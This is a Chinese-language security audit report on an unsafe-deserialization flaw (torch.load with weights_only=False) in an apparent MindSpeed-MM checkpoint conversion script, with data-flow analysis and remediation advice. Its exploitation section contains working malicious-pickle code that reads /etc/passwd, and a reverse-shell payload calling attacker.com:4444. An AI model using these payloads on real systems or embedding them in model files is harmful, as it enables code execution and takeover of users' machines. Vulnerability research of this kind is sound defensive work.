# VULN-CHECKPOINT-001: 不安全反序列化漏洞 (CWE-502)

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-CHECKPOINT-001 |
| **漏洞类型** | Unsafe Deserialization (不安全反序列化) |
| **CWE编号** | CWE-502: Deserialization of Untrusted Data |
| **严重级别** | Critical |
| **置信度** | 95% |
| **CVSS评分** | 9.8 (Critical) |
| **CVSS向量** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |

## 漏洞位置

```
文件: checkpoint/vlm_model/mm_to_hf.py
行号: 92
函数: load_from_mm
```

### 漏洞代码片段

```python
# 第63-111行，load_from_mm 函数
def load_from_mm(load_dir: Path,
                 vit_pp_list: PP_LAYER_NUM_T,
                 llm_pp_list: PP_LAYER_NUM_T,
                 tp_size: int = 1,
                 audio_pp_list: PP_LAYER_NUM_T = None,
                 ep_size: int = 1,
                 num_experts: int = 1) -> List[STATE_DICT_T]:
    import mindspeed.megatron_adaptor  # noqa
    save_iteration = load_dir.joinpath(LATEST_TXT).read_text()
    save_dir = load_dir.joinpath(f"iter_{int(save_iteration):07}" if save_iteration != "release" else save_iteration)

    # ... 省略部分代码 ...

    for tp_rank in range(tp_size):
        pp_state_dict = {}
        for pp_rank in range(global_pp_size):
            if ep_size > 1:
                for ep_rank in range(ep_size):
                    if global_pp_size > 1:
                        current_path = save_dir.joinpath(f"mp_rank_{int(tp_rank):02}_{int(pp_rank):03}_{int(ep_rank):03}")
                    else:
                        current_path = save_dir.joinpath(f"mp_rank_{int(tp_rank):02}_{int(ep_rank):03}")
                    pt_path = current_path.joinpath(MEGATRON_CKPT_NAME)
                    dict_ep = {}
                    # ═══════════════════════════════════════════════════════════════
                    # 漏洞点: 第92行
                    # weights_only=False 显式启用 pickle 反序列化
                    # ═══════════════════════════════════════════════════════════════
                    for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=False)['model'].items():
                        if tensor is not None:
                            new_key = rename_pp_ep_parameter(param, vit_pp_list, llm_pp_list, audio_pp_list, pp_rank, ep_rank, ep_size, num_experts)
                            dict_ep.update({new_key: tensor})
                    pp_state_dict.update(dict_ep)
    # ... 后续代码 ...
```

## 漏洞描述

### 核心问题

该漏洞源于 `torch.load()` 函数调用时显式设置 `weights_only=False`：

1. **显式禁用安全模式**: `weights_only=False` 明确禁用了 PyTorch 的安全加载模式
2. **Pickle 反序列化风险**: 当 `weights_only=False` 时，`torch.load()` 使用 Python `pickle` 模块进行反序列化
3. **任意代码执行**: Pickle 反序列化过程中可以执行任意 Python 代码
4. **用户可控路径**: `pt_path` 由用户提供的 CLI 参数 `--mm_dir` 间接控制

### 漏洞触发条件

| 条件 | 值 | 说明 |
|------|-----|------|
| `ep_size > 1` | True | 启用 Expert Parallel 分支时触发此漏洞 |
| `weights_only` | False | 显式设置为 False |
| `pt_path` 来源 | CLI参数 | 用户通过 `--mm_dir` 参数控制 |

## 数据流分析

### 完整攻击链路

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 攻击入口: CLI 命令行参数                                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│ checkpoint/convert_cli.py:13-19                                              │
│                                                                              │
│   def main():                                                                │
│       jsonargparse.set_parsing_settings(docstring_parse_attribute_docstrings=True) │
│       jsonargparse.auto_cli(Commandable.subclasses, as_positional=False)   │
│                                                                              │
│ 用户输入: --mm_dir /path/to/malicious/checkpoint                            │
└─────────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ 配置解析: ConvertHFConfig (Pydantic 模型)                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│ checkpoint/vlm_model/config.py:176-179                                       │
│                                                                              │
│   class ConvertHFConfig(ConvertMMConfig):                                    │
│       """mindspeed-mm训练出来的权重转换为huggingface格式权重的配置"""           │
│       save_hf_dir: Path                                                      │
│       """mm转回hf格式时保存的路径"""                                           │
│                                                                              │
│ 继承自 ConvertMMConfig:                                                      │
│   class ConvertMMConfig(BaseModel):                                          │
│       mm_dir: Path  # ← 用户控制的路径                                        │
│       """mm保存的路径"""                                                      │
└─────────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ 模型转换调用链                                                                │
├─────────────────────────────────────────────────────────────────────────────┤
│ checkpoint/vlm_model/mm_to_hf.py:220-235                                     │
│                                                                              │
│   def convert_mm_to_hf(convert_config: ConvertHFConfig, ...):                │
│       # ...                                                                  │
│       state_dicts = load_from_mm(                                           │
│           convert_config.mm_dir,  # ← 用户控制的路径传入                      │
│           parallel_config.vit_pp_layers,                                     │
│           parallel_config.llm_pp_layers,                                     │
│           max_tp_size,                                                       │
│           parallel_config.audio_pp_layers,                                   │
│           ep_size,                                                           │
│           num_experts                                                        │
│       )                                                                      │
└─────────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ 路径构造                                                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│ checkpoint/vlm_model/mm_to_hf.py:71-90                                       │
│                                                                              │
│   def load_from_mm(load_dir: Path, ...):                                     │
│       save_iteration = load_dir.joinpath(LATEST_TXT).read_text()            │
│       save_dir = load_dir.joinpath(f"iter_{int(save_iteration):07}"...)     │
│                                                                              │
│       for tp_rank in range(tp_size):                                         │
│           for pp_rank in range(global_pp_size):                              │
│               if ep_size > 1:                                                │
│                   for ep_rank in range(ep_size):                             │
│                       current_path = save_dir.joinpath(                      │
│                           f"mp_rank_{int(tp_rank):02}_{int(pp_rank):03}_{int(ep_rank):03}" │
│                       )                                                      │
│                       pt_path = current_path.joinpath(MEGATRON_CKPT_NAME)    │
│                       # pt_path = load_dir/iter_XXXXXX/mp_rank_XX_XXX_XXX/model_optim_rng.pt │
└─────────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ 漏洞触发: 不安全反序列化                                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│ checkpoint/vlm_model/mm_to_hf.py:92                                          │
│                                                                              │
│   for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=False)['model'].items(): │
│                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ │
│                       weights_only=False 启用 pickle 反序列化                 │
│                       pt_path 来自用户控制的 CLI 参数 --mm_dir                │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 攻击路径分析

### 攻击场景

1. **恶意 Checkpoint 分发攻击**
   - 攻击者制作包含恶意代码的 `.pt` checkpoint 文件
   - 通过模型仓库 (如 Hugging Face)、论坛、邮件等方式分发
   - 用户下载并使用 `convert_cli.py` 转换权重时触发漏洞

2. **供应链攻击**
   - 攻击者入侵模型仓库或镜像站
   - 替换合法 checkpoint 文件为恶意版本
   - 用户在不知情的情况下加载恶意 checkpoint

3. **中间人攻击**
   - 攻击者拦截未加密的模型下载流量
   - 替换模型文件为恶意版本
   - 用户加载被篡改的模型时触发漏洞

### 攻击者能力要求

| 能力 | 难度 | 说明 |
|------|------|------|
| 制造恶意 checkpoint | 低 | Python pickle 漏洞利用代码广泛存在 |
| 分发恶意文件 | 中 | 需要社交媒体工程或入侵可信源 |
| 触发用户加载 | 低 | 用户仅需执行转换脚本 |
| 代码执行权限 | 高 | 可获得与运行脚本用户相同的权限 |

## 利用步骤

### 步骤 1: 创建恶意 Checkpoint 文件

```python
import torch
import os

class MaliciousPickle:
    """
    恶意 Pickle 类 - 在反序列化时执行任意代码
    """
    def __reduce__(self):
        # 执行任意命令 - 这里演示读取敏感文件
        import os
        return (os.system, ('id > /tmp/pwned && cat /etc/passwd >> /tmp/pwned',))

# 创建包含恶意 payload 的 checkpoint
malicious_checkpoint = {
    'model': {
        'layer.weight': torch.randn(10, 10),
        '__malicious__': MaliciousPickle()  # 恶意对象
    },
    'iteration': 1000
}

# 保存恶意 checkpoint
save_dir = 'malicious_checkpoint/iter_0001000/mp_rank_00_000'
os.makedirs(save_dir, exist_ok=True)

# 创建 latest 文件
with open('malicious_checkpoint/latest_checkpointed_iteration.txt', 'w') as f:
    f.write('1000')

# 保存恶意 .pt 文件
torch.save(malicious_checkpoint, f'{save_dir}/model_optim_rng.pt')
print("恶意 checkpoint 已创建")
```

### 步骤 2: 触发漏洞

```bash
# 用户执行正常的权重转换命令
python checkpoint/convert_cli.py \
    --mm_dir /path/to/malicious_checkpoint \
    --hf_dir /path/to/hf_model \
    --save_hf_dir /path/to/output \
    --parallel_config.llm_pp_layers [24] \
    --parallel_config.vit_pp_layers [24] \
    --parallel_config.tp_size 1 \
    --parallel_config.ep_size 2  # 触发 ep_size > 1 分支 (漏洞路径)
```

### 步骤 3: 漏洞执行过程

```
1. convert_cli.py 解析 CLI 参数
   ↓
2. ConvertHFConfig 验证参数 (仅类型检查，无安全检查)
   ↓
3. convert_mm_to_hf() 调用 load_from_mm()
   ↓
4. load_from_mm() 构造 pt_path = malicious_checkpoint/iter_0001000/mp_rank_00_000/model_optim_rng.pt
   ↓
5. torch.load(pt_path, weights_only=False) 触发 pickle 反序列化
   ↓
6. MaliciousPickle.__reduce__() 被调用
   ↓
7. 执行 os.system('id > /tmp/pwned && cat /etc/passwd >> /tmp/pwned')
   ↓
8. 攻击者在目标系统获得代码执行权限
```

## 危害评估

### 影响范围

| 影响维度 | 评估 |
|---------|------|
| **机密性** | 高 - 攻击者可读取任意文件、窃取模型权重、获取环境变量和密钥 |
| **完整性** | 高 - 攻击者可修改文件、植入后门、篡改模型权重 |
| **可用性** | 高 - 攻击者可删除文件、破坏系统、导致服务拒绝 |
| **横向移动** | 高 - 攻击者可能通过此漏洞获取内网访问权限 |

### 潜在攻击后果

1. **数据泄露**
   - 窃取训练数据
   - 获取模型权重和知识产权
   - 读取配置文件中的敏感信息（API 密钥、数据库密码等）

2. **系统入侵**
   - 建立反向 shell 持久化访问
   - 植入后门程序
   - 窃取 SSH 密钥进行横向移动

3. **供应链污染**
   - 修改输出的 HuggingFace 模型文件
   - 注入恶意代码到下游用户

4. **加密货币挖矿**
   - 利用服务器计算资源进行挖矿

### 实际攻击示例

```python
# 更具攻击性的 payload 示例
class AdvancedMaliciousPickle:
    def __reduce__(self):
        import subprocess
        # 多种攻击载荷组合
        payload = '''
import socket
import subprocess
import os

# 反向 shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.com", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
'''
        return (exec, (payload,))
```

## 修复建议

### 短期修复 (立即可实施)

#### 方案 1: 启用 weights_only=True

```python
# 修复前 (漏洞代码)
for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=False)['model'].items():

# 修复后 (安全代码)
for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=True)['model'].items():
```

**注意事项:**
- `weights_only=True` 仅加载张量数据，不支持加载包含任意 Python 对象的 checkpoint
- Megatron-LM 格式的 checkpoint 可能包含额外状态（如 optimizer state），可能需要调整保存格式

#### 方案 2: 添加校验和验证

```python
import hashlib

def load_from_mm_safe(load_dir: Path, ...):
    # 计算 checkpoint 文件哈希
    expected_hash = get_expected_hash(load_dir)  # 从可信源获取
    
    for ...:
        pt_path = current_path.joinpath(MEGATRON_CKPT_NAME)
        
        # 验证文件完整性
        with open(pt_path, 'rb') as f:
            actual_hash = hashlib.sha256(f.read()).hexdigest()
        
        if actual_hash != expected_hash:
            raise SecurityError(f"Checkpoint integrity check failed for {pt_path}")
        
        # 使用安全模式加载
        state_dict = torch.load(pt_path, map_location='cpu', weights_only=True)
```

### 中期修复 (建议在下个版本实施)

#### 方案 3: 使用 Safetensors 格式

```python
from safetensors.torch import load_file

def load_from_mm_safetensors(load_dir: Path, ...):
    for ...:
        safetensors_path = current_path.joinpath("model.safetensors")
        
        # Safetensors 是安全的序列化格式，不支持任意代码执行
        state_dict = load_file(safetensors_path)
```

**迁移步骤:**
1. 修改 checkpoint 保存逻辑，使用 `safetensors` 格式
2. 提供迁移脚本转换现有 `.pt` 文件
3. 更新加载逻辑使用 safetensors

#### 方案 4: 添加警告和用户确认

```python
import warnings

def load_from_mm(load_dir: Path, ...):
    # 安全警告
    warnings.warn(
        "Loading checkpoint with weights_only=False. "
        "This allows arbitrary code execution via pickle deserialization. "
        "Only load checkpoints from trusted sources.",
        UserWarning,
        stacklevel=2
    )
    
    # 要求用户确认 (交互模式)
    if os.isatty(0):
        response = input("Do you trust this checkpoint source? [y/N]: ")
        if response.lower() != 'y':
            raise SecurityError("Checkpoint loading cancelled by user")
    
    # 继续加载...
```

### 长期修复 (架构级别改进)

1. **实现 Checkpoint 签名机制**
   ```python
   # 使用非对称加密签名 checkpoint
   def sign_checkpoint(checkpoint_path: Path, private_key_path: Path):
       # 生成签名
       signature = generate_signature(checkpoint_path, private_key_path)
       # 存储签名
       (checkpoint_path.with_suffix('.sig')).write_bytes(signature)
   
   def verify_checkpoint(checkpoint_path: Path, public_key_path: Path):
       signature = (checkpoint_path.with_suffix('.sig')).read_bytes()
       return verify_signature(checkpoint_path, signature, public_key_path)
   ```

2. **沙箱隔离执行**
   - 在 Docker 容器中运行 checkpoint 转换
   - 限制网络访问和文件系统权限
   - 使用 seccomp 限制系统调用

3. **安全配置选项**
   ```python
   class ConvertHFConfig(BaseModel):
       mm_dir: Path
       save_hf_dir: Path
       # 新增安全选项
       allow_unsafe_checkpoint: bool = False  # 默认禁止不安全加载
       checkpoint_hash: Optional[str] = None  # 可选的校验哈希
   ```

## 相关漏洞

| 漏洞ID | 文件 | 行号 | 关系 |
|--------|------|------|------|
| VULN-CHECKPOINT-002 | mm_to_hf.py | 107 | 同一函数，不同分支 (ep_size <= 1) |
| VULN-CHECKPOINT-003 | hf_to_mm.py | 316 | 反向转换路径 |
| VULN-CHECKPOINT-004 | save_load_utils.py | 36 | 加载工具函数 |

## 参考文档

1. **CWE-502: Deserialization of Untrusted Data**
   https://cwe.mitre.org/data/definitions/502.html

2. **PyTorch Security Advisory: CVE-2025-32434**
   https://github.com/pytorch/pytorch/security/advisories (weights_only 绕过漏洞)

3. **PyTorch torch.load Documentation**
   https://pytorch.org/docs/main/generated/torch.load.html

4. **Python pickle Module Security Considerations**
   https://docs.python.org/3/library/pickle.html

5. **项目安全声明**
   `docs/zh/SECURITYNOTE.md` 已记录此风险：
   > "Megatron-LM 框架的原生代码调用、MindSpeed MM提供的权重转换脚本中，会显式地将 weights_only=False。这意味着这些加载操作继承了 pickle模块的潜在危险，允许执行任意代码。"

## 结论

**漏洞状态: 已确认**

该漏洞是一个真实存在的高危安全问题。虽然项目文档已承认此风险存在，但从安全角度来看：

1. **漏洞可被利用**: 攻击者可以构造恶意 checkpoint 文件，在用户执行权重转换时获得代码执行权限

2. **攻击面广**: 任何使用 `convert_cli.py` 或 `load_from_mm()` 函数的场景都可能受到影响

3. **影响严重**: 成功利用可导致系统完全沦陷、数据泄露、横向移动等严重后果

4. **修复可行**: 通过启用 `weights_only=True`、使用 safetensors 格式、添加完整性校验等方式可有效缓解

**建议优先级: 紧急**
- 立即添加安全警告和用户确认机制
- 短期内提供 `weights_only=True` 选项
- 中长期迁移至 safetensors 格式

---

*报告生成时间: 2026-04-20*
*漏洞分析版本: MindSpeed-MM v1.0*
